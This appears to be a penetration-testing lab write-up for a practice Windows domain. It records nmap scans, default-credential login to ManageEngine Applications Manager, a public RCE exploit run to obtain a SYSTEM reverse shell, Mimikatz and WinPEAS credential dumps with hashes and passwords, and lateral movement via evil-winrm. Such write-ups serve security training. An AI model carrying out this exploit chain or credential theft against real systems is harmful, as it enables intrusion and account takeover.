## Methodology:
- Discovered website (`44444/HTTP`, `8443/HTTPS`) with Nmap scan
- Manage Engine's Applications Manager v.14710 w/ manual browsing
- Online search shows working default creds `admin:admin`
	- Fuzzing seems like rabbit hole
- Searchsploit shows RCE exploit `48793.py` 
- Gain reverse shell on 95 as NT AUTH/SYSTEM
- Enumeration:
	- net use - Users: `charlotte`, `michael`
	- WinPEAS - Auto-login creds: `administrator:Reality2Show4!.?`
	- Mimikatz - `sekurlsa::logonpasswords`
		- Admin's NTLM: a51493b0b06e5e35f855245e71af1d14
		- Username : `apache`
		- Domain   : `era.secura.local`
		- Password : `New2Era4.!`
- Attack attempt:
	- Notice `winrm` on port `47001` is open
		- evil-winrm for foothold on x.96


## Nmap Scan

#### Open Ports
```bash
nmap -v -p- --max-scan-delay=0 -oN 95/all_ports.txt 192.168.184.95
	PORT      STATE SERVICE
	135/tcp   open  msrpc
	139/tcp   open  netbios-ssn
	445/tcp   open  microsoft-ds
	5001/tcp  open  commplex-link
	5040/tcp  open  unknown
	5985/tcp  open  wsman
	7680/tcp  open  pando-pub
	8443/tcp  open  https-alt
	12000/tcp open  cce4x
	44444/tcp open  cognex-dataman
	47001/tcp open  winrm
	49161/tcp open  unknown
	49162/tcp open  unknown
	49664/tcp open  unknown
	49665/tcp open  unknown
	49666/tcp open  unknown
	49668/tcp open  unknown
	49669/tcp open  unknown
	49670/tcp open  unknown
	49682/tcp open  unknown
	49687/tcp open  unknown
	49704/tcp open  unknown
	57372/tcp open  unknown
	57398/tcp open  unknown
```

#### Version & Default Scripts
```bash
nmap -v -sV -sC -p 135,139,445,5001,5040,5985,8443,12000,44444,47001,49664-49672,54233,54234,57499,57528 -oN 95/open_sVsC.txt 192.168.184.95

	PORT      STATE SERVICE         VERSION
	135/tcp   open  msrpc           Microsoft Windows RPC
	139/tcp   open  netbios-ssn     Microsoft Windows netbios-ssn
	445/tcp   open  microsoft-ds?
	5001/tcp  open  commplex-link?
	| fingerprint-strings: 
	|   SIPOptions: 
	|     HTTP/1.1 200 OK
	|     Content-Type: text/html; charset=ISO-8859-1
	|     Content-Length: 132
	|_    MAINSERVER_RESPONSE:<serverinfo method="setserverinfo" mainserver="5001" webserver="44444" pxyname="192.168.45.151" startpage=""/>
	5040/tcp  open  unknown
	5985/tcp  open  http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	|_http-title: Not Found
	|_http-server-header: Microsoft-HTTPAPI/2.0
	8443/tcp  open  ssl/https-alt   AppManager
	|_ssl-date: 2024-10-04T21:10:47+00:00; +23s from scanner time.
	| http-methods: 
	|_  Supported Methods: GET POST
	|     ...
	|_http-server-header: AppManager
	| fingerprint-strings: 
	|   FourOhFourRequest: 
	|     HTTP/1.1 404 
	|     Set-Cookie: JSESSIONID_APM_44444=D241E712005F1007093B06D49B69E9E7; Path=/; Secure; HttpOnly
	|     ...
	|   GetRequest: 
	|     HTTP/1.1 200 
	|     Set-Cookie: JSESSIONID_APM_44444=BFF7138A476CEFB2A186528223679C18; Path=/; Secure; HttpOnly
	|     ...
	|   HTTPOptions: 
	|     HTTP/1.1 403 
	|     Set-Cookie: JSESSIONID_APM_44444=12DFCD8A8B51EC270867F1E23B775B74; Path=/; Secure; HttpOnly    # NOTE -> Follows info we get for port 44444
	|     ...
	12000/tcp open  cce4x?
	44444/tcp open  cognex-dataman?
	| fingerprint-strings: 
	|   GetRequest: 
	|     HTTP/1.1 200 
	|     Set-Cookie: JSESSIONID_APM_44444=269CC0F0F745522FEB8406F313710AC3; Path=/; HttpOnly
	|     ...
	|     Server: AppManager
	|   ...
	|   RTSPRequest: 
	|     HTTP/1.1 505 
	|     vary: accept-encoding
	|     Content-Type: text/html;charset=utf-8
	|     Content-Language: en
	|     Content-Length: 2142
	|     Date: Fri, 04 Oct 2024 21:06:58 GMT
	|     Server: AppManager
	|     ...
	47001/tcp open  http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	|_http-server-header: Microsoft-HTTPAPI/2.0
	|_http-title: Not Found
	49664/tcp open  msrpc           Microsoft Windows RPC
	...
	49671/tcp open  msrpc           Microsoft Windows RPC
	49672/tcp open  tcpwrapped
	54233/tcp open  unknown
	| fingerprint-strings: 
	|   SMBProgNeg, X11Probe: 
	|_    CLOSE_SESSION
	54234/tcp open  unknown
	| fingerprint-strings: 
	|   SMBProgNeg, X11Probe: 
	|_    CLOSE_SESSION
	57499/tcp open  java-rmi        Java RMI
	57528/tcp open  unknown
	
	==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
	...
	
	Host script results:
	|_clock-skew: mean: 23s, deviation: 0s, median: 22s
	| smb2-security-mode: 
	|   3:1:1: 
	|_    Message signing enabled but not required
	| smb2-time: 
	|   date: 2024-10-04T21:09:28
	|_  start_date: N/A
```


## Site
![](SECURA_95_site.png)

- Fuzzed - Nothing actionable
```bash
ffuf -u http://192.168.184.95:44444/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -o ffuf_44444.txt
```

- Default creds `admin:admin` work
![](SECURA_95_site_about.png)

- Searchsploit
```bash
searchsploit manage engine application manager 14
	---------------------------------------------------------------------------------------- ---------------------------------
	 Exploit Title                                                                          |  Path
	---------------------------------------------------------------------------------------- ---------------------------------
	...
	ManageEngine Applications Manager 14700 - Remote Code Execution (Authenticated)         | java/webapps/48793.py
	...
	---------------------------------------------------------------------------------------- ---------------------------------
	Shellcodes: No Results
	Papers: No Results
```


## Reverse Shell
- Using 48793.py
```bash
# Exploit won't work on jdk 7 - update jdk to 8
sudo apt update && sudo apt install default-jdk
sed -i 's/release 7/release 8/g' 48793.py

# Run
python3 48793.py http://192.168.184.95:44444 admin admin 192.168.45.201 5555 
	[*] Visiting page to retrieve initial cookies...
	[*] Retrieving admin cookie...
	[*] Getting base directory of ManageEngine...
	[*] Found base directory: C:\Program Files\ManageEngine\AppManager14
	[*] Creating JAR file...
	Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
	warning: [options] source value 8 is obsolete and will be removed in a future release
	warning: [options] target value 8 is obsolete and will be removed in a future release
	warning: [options] To suppress warnings about obsolete options, use -Xlint:-options.
	3 warnings
	Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
	added manifest
	adding: weblogic/jndi/Environment.class(in = 1844) (out= 1098)(deflated 40%)
	[*] Uploading JAR file...
	[*] Attempting to upload JAR directly to targeted Weblogic folder...
	[!] Failed to upload JAR directly, continue to add and execute job to move JAR...
	[*] Creating a task to move the JAR file to relative path: classes/weblogic/version8/...
	[*] Found actionname: move_weblogic_jar3864 with found actionid 10000003
	[*] Executing created task with id: 10000003 to copy JAR...
	[*] Task 10000003 has been executed successfully
	[*] Deleting created task as JAR has been copied...
	[*] Running the Weblogic credentialtest which triggers the code in the JAR...
	[*] Check your shell...
```
	- Got a shell.   NOTE:  Attack didn't work initially. Had to apply jdk fix to kali and revert machine

```powershell
whoami
	nt authority\system

cd C:\

dir /s proof.txt
	Volume in drive C has no label.
	 Volume Serial Number is A878-B85B
	
	 Directory of C:\Users\Administrator\Desktop
	
	10/09/2024  09:40 PM                34 proof.txt
	               1 File(s)             34 bytes
	
	     Total Files Listed:
	               1 File(s)             34 bytes
	               0 Dir(s)  16,780,812,288 bytes free

type c:\users\administrator\desktop\proof.txt
	b0624467dd801d947277061ea5e6bb70
```

## Further enumeration
- Default web working directory
```powershell
dir
 Directory of 
 \working
	...
	08/03/2022  10:15 PM                 0 adtappmanager.txt
	08/03/2022  10:17 PM                 0 am.lock
	06/08/2020  01:12 PM    <DIR>          apache
	...
	06/08/2020  01:09 PM           622,360 wrapper.exe


type mysql\my.ini
	#default password for MySQL
	password=appmanager
```

- Look for interesting files in user's path
```powershell
Get-ChildItem -Path . -Include *.txt,*.doc,*.docx,*.xls,*.xlsx,*.pdf,*.db,*.ini -Recurse -ErrorAction SilentlyContinue -Force -Exclude desktop.ini
...

	Directory: C:\Users\Administrator\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          3/9/2022   3:49 AM         307015 english_wikipedia.txt
-a----          3/9/2022   3:49 AM          30420 female_names.txt
-a----          3/9/2022   3:49 AM           7656 male_names.txt
-a----          3/9/2022   3:49 AM         271951 passwords.txt                   # NOTE
-a----          3/9/2022   3:49 AM          86077 surnames.txt
-a----          3/9/2022   3:49 AM         183450 us_tv_and_film.txt

...
    Directory: C:\Users\Administrator\Desktop
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/10/2024   8:44 PM             34 proof.txt


# App Manager logs
more "C:\Program Files\ManageEngine\AppManager14\logs\actions.txt"
	Product = Applications Manager 14 (Build 14710)
          Service Pack Version =NONE
          os name=Windows 10
          os version=10.0
          os architecture=amd64
          java version=1.8.0_202
          java vendor=Oracle Corporation
          java specification=Java Platform API Specification
          java specification version=1.8
          java vm name=Java HotSpot(TM) 64-Bit Server VM
          java vm information =mixed mode
          java compiler=null
          ********************************************************
         -------RDBMS related information------
          database product name = PostgreSQL
          database product version=9.2.4                                           # -> NOTE
          database driver name=PostgreSQL Native Driver
          database driver version=PostgreSQL 9.0 JDBC3 (build 801)
          database user name=postgres
          database URL=jdbc:postgresql://localhost:15432/amdb?dontTrackOpenResources=true&useUnicode=true&characterEncoding=UTF-8


more "C:\Program Files\ManageEngine\AppManager14\working\html\Help.txt"
	The MIB browser applet allows you to load and browse multiple MIB modules and view data 
	on an SNMP agent.  You can also view real-time graphs, and tables, of SNMP data.
	
	Version 1.1 includes a number of enhancements, including an SNMP walk capability,


BlackListCommands.properties
more "C:\Program Files\ManageEngine\AppManager14\conf\BlackListCommands.properties"
	#$Id$
	# Below are the blacklisted commands, that are not allowed for the Execute Program Action
	
	linux_commands=chmod,crontab,netstat,rm,chattr
	windows_commands=del,deltree,netstat
	# Below is the regex which we are using to validate the name like User Name.
	am.name.validation.regex=[^/\\:;|\\[\\]=,*?<>\"`%\'^]+
```

- Domain Users
```powershell
net user /domain
	The request will be processed at a domain controller for domain secura.yzx.
	
	User accounts for \\dc01.secura.yzx
	-------------------------------------------------------------------------------
	Administrator            charlotte                DefaultAccount           
	Guest                    krbtgt                   michael                  
	The command completed with one or more errors.


net user charlotte /domain
	The request will be processed at a domain controller for domain secura.yzx.
	
	User name                    charlotte
	Full Name                    charlotte
	Comment                      
	User's comment               
	Country/region code          000 (System Default)
	Account active               Yes
	Account expires              Never
	
	Password last set            8/5/2022 6:37:50 PM
	Password expires             Never
	Password changeable          8/6/2022 6:37:50 PM
	Password required            Yes
	User may change password     Yes
	
	Workstations allowed         All
	Logon script                 
	User profile                 
	Home directory               
	Last logon                   Never
	
	Logon hours allowed          All
	
	Local Group Memberships      *Remote Management Use
	Global Group memberships     *Domain Users         
	The command completed successfully.


net user michael /domain
	The request will be processed at a domain controller for domain secura.yzx.
	
	User name                    michael
	Full Name                    michael
	Comment                      
	User's comment               
	Country/region code          000 (System Default)
	Account active               Yes
	Account expires              Never
	
	Password last set            8/5/2022 6:36:23 PM
	Password expires             Never
	Password changeable          8/6/2022 6:36:23 PM
	Password required            Yes
	User may change password     Yes
	
	Workstations allowed         All
	Logon script                 
	User profile                 
	Home directory               
	Last logon                   Never
	
	Logon hours allowed          All
	
	Local Group Memberships      
	Global Group memberships     *Domain Users         
	The command completed successfully.
```


- Domain Groups
```powershell
net group /domain
	The request will be processed at a domain controller for domain secura.yzx.
	
	Group Accounts for \\dc01.secura.yzx
	-------------------------------------------------------------------------------
	*Cloneable Domain Controllers
	*DnsUpdateProxy
	*Domain Admins
	*Domain Computers
	*Domain Controllers
	*Domain Guests
	*Domain Users
	*Enterprise Admins
	*Enterprise Key Admins
	*Enterprise Read-only Domain Controllers
	*Group Policy Creator Owners
	*Key Admins
	*Protected Users
	*Read-only Domain Controllers
	*Schema Admins
	The command completed with one or more errors.
```


- Domain Shares
```powershell
net view \\dc01 /all
	Shared resources at \\dc01
	
	Share name  Type  Used as  Comment              
	-------------------------------------------------------------------------------
	ADMIN$      Disk           Remote Admin         
	C$          Disk           Default share        
	IPC$        IPC            Remote IPC           
	NETLOGON    Disk           Logon server share   
	SYSVOL      Disk           Logon server share   
	test        Disk                                
	The command completed successfully.
```
	- `dc01` was discovered during nmap -sV scan of .97


## Mimikatz
- Dump of creds
```powershell
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 301541 (00000000:000499e5)
Session           : Interactive from 1
User Name         : Administrator
Domain            : SECURE
Logon Server      : SECURE
Logon Time        : 9/28/2024 1:25:49 AM
SID               : S-1-5-21-3197578891-1085383791-1901100223-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : SECURE
         * NTLM     : a51493b0b06e5e35f855245e71af1d14
         * SHA1     : 02fb73dd0516da435ac4681bda9cbed3c128e1aa
		...
         * Username : apache
         * Domain   : era.secura.local
         * Password : New2Era4.!
        cloudap :
```

## WinPEAS
```powershell
����������͹ Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultUserName               :  administrator
    DefaultPassword               :  Reality2Show4!.?
```

## Laterally move to x.96
```powershell
# In Kali
evil-winrm -i 192.168.226.96 -u apache -p "New2Era4.\!"

	Evil-WinRM shell v3.5
	
	Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
	
	Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
	
	Info: Establishing connection to remote endpoint
	*Evil-WinRM* PS C:\Users\apache.ERA\Documents> whoami
	era\apache
	*Evil-WinRM* PS C:\Users\apache.ERA\Documents> hostname
	era
	*Evil-WinRM* PS C:\Users\apache.ERA\Documents> ipconfig
	
	Windows IP Configuration
	
	
	Ethernet adapter Ethernet0:
	
	   Connection-specific DNS Suffix  . :
	   IPv4 Address. . . . . . . . . . . : 192.168.226.96
	   Subnet Mask . . . . . . . . . . . : 255.255.255.0
	   Default Gateway . . . . . . . . . : 192.168.226.254
```

